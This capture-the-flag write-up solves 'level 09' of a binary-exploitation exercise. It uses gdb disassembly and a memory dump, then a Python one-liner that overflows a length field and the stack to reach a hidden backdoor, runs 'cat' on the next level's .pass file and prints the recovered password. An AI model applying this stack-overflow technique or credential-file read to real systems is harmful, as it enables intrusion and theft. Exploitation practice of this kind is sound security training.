# level 09

## get_binary

```shell
scp -P 4242 level09@192.168.0.0:/home/users/level09/level09 level09.bin
```

## Exploit

```shell
(gdb) run
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 
>: Welcome, 
>: Msg @Unix-Dude
>>: 
>: Msg sent!
(gdb) disassemble main
Dump of assembler code for function main:
   0x0000555555554aa8 <+0>:     push   %rbp
   0x0000555555554aa9 <+1>:     mov    %rsp,%rbp
   0x0000555555554aac <+4>:     lea    0x15d(%rip),%rdi        # 0x555555554c10
   0x0000555555554ab3 <+11>:    callq  0x555555554730 <puts@plt>
   0x0000555555554ab8 <+16>:    callq  0x5555555548c0 <handle_msg>
   0x0000555555554abd <+21>:    mov    $0x0,%eax
   0x0000555555554ac2 <+26>:    pop    %rbp
   0x0000555555554ac3 <+27>:    retq   
End of assembler dump.
(gdb) disassemble secret_backdoor 
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:     push   %rbp
   0x000055555555488d <+1>:     mov    %rsp,%rbp
   0x0000555555554890 <+4>:     add    $0xffffffffffffff80,%rsp
   0x0000555555554894 <+8>:     mov    0x20171d(%rip),%rax        # 0x555555755fb8
   0x000055555555489b <+15>:    mov    (%rax),%rax
   0x000055555555489e <+18>:    mov    %rax,%rdx
   0x00005555555548a1 <+21>:    lea    -0x80(%rbp),%rax
   0x00005555555548a5 <+25>:    mov    $0x80,%esi
   0x00005555555548aa <+30>:    mov    %rax,%rdi
   0x00005555555548ad <+33>:    callq  0x555555554770 <fgets@plt>
   0x00005555555548b2 <+38>:    lea    -0x80(%rbp),%rax
   0x00005555555548b6 <+42>:    mov    %rax,%rdi
   0x00005555555548b9 <+45>:    callq  0x555555554740 <system@plt>
   0x00005555555548be <+50>:    leaveq 
   0x00005555555548bf <+51>:    retq   
End of assembler dump.
(gdb) disassemble set_msg 
Dump of assembler code for function set_msg:
   0x0000555555554932 <+0>:     push   %rbp
   0x0000555555554933 <+1>:     mov    %rsp,%rbp
   0x0000555555554936 <+4>:     sub    $0x410,%rsp
   0x000055555555493d <+11>:    mov    %rdi,-0x408(%rbp)
   0x0000555555554944 <+18>:    lea    -0x400(%rbp),%rax
   0x000055555555494b <+25>:    mov    %rax,%rsi
   0x000055555555494e <+28>:    mov    $0x0,%eax
   0x0000555555554953 <+33>:    mov    $0x80,%edx
   0x0000555555554958 <+38>:    mov    %rsi,%rdi
   0x000055555555495b <+41>:    mov    %rdx,%rcx
   0x000055555555495e <+44>:    rep stos %rax,%es:(%rdi)
   0x0000555555554961 <+47>:    lea    0x265(%rip),%rdi        # 0x555555554bcd
   0x0000555555554968 <+54>:    callq  0x555555554730 <puts@plt>
   0x000055555555496d <+59>:    lea    0x26b(%rip),%rax        # 0x555555554bdf
   0x0000555555554974 <+66>:    mov    %rax,%rdi
   0x0000555555554977 <+69>:    mov    $0x0,%eax
   0x000055555555497c <+74>:    callq  0x555555554750 <printf@plt>
   0x0000555555554981 <+79>:    mov    0x201630(%rip),%rax        # 0x555555755fb8
   0x0000555555554988 <+86>:    mov    (%rax),%rax
   0x000055555555498b <+89>:    mov    %rax,%rdx
   0x000055555555498e <+92>:    lea    -0x400(%rbp),%rax
   0x0000555555554995 <+99>:    mov    $0x400,%esi
   0x000055555555499a <+104>:   mov    %rax,%rdi
   0x000055555555499d <+107>:   callq  0x555555554770 <fgets@plt>
   0x00005555555549a2 <+112>:   mov    -0x408(%rbp),%rax
   0x00005555555549a9 <+119>:   mov    0xb4(%rax),%eax
   0x00005555555549af <+125>:   movslq %eax,%rdx
   0x00005555555549b2 <+128>:   lea    -0x400(%rbp),%rcx
   0x00005555555549b9 <+135>:   mov    -0x408(%rbp),%rax
   0x00005555555549c0 <+142>:   mov    %rcx,%rsi
   0x00005555555549c3 <+145>:   mov    %rax,%rdi
   0x00005555555549c6 <+148>:   callq  0x555555554720 <strncpy@plt>
   0x00005555555549cb <+153>:   leaveq 
   0x00005555555549cc <+154>:   retq
End of assembler dump.
(gdb) break *0x00005555555549cc
(gdb) run
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAA
>: Welcome, AAAA
>: Msg @Unix-Dude
>>: BBBB
(gdb) info registers 
rax            0x7fffffffe500   140737488348416
(gdb) x/64wx 0x7fffffffe500
0x7fffffffe500: 0x42424242      0x0000000a      0x00000000      0x00000000
0x7fffffffe510: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe520: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe530: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe540: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe550: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe560: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe570: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe580: 0x00000000      0x00000000      0x00000000      0x41414141
0x7fffffffe590: 0x0000000a      0x00000000      0x00000000      0x00000000
0x7fffffffe5a0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe5b0: 0x00000000      0x0000008c      0xffffe5d0      0x00007fff
0x7fffffffe5c0: 0xffffe5d0      0x00007fff      0x55554abd      0x00005555
0x7fffffffe5d0: 0x00000000      0x00000000      0xf7a3d7ed      0x00007fff
0x7fffffffe5e0: 0x00000000      0x00000000      0xffffe6b8      0x00007fff
0x7fffffffe5f0: 0x55554000      0x00000001      0x55554aa8      0x00005555
```
```shell
python -c '\
print("AAAA" * 10 + "\xca");\
print("BBBB" * 50 + "\x8c\x48");\
print("cat /home/users/end/.pass");\
' | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```
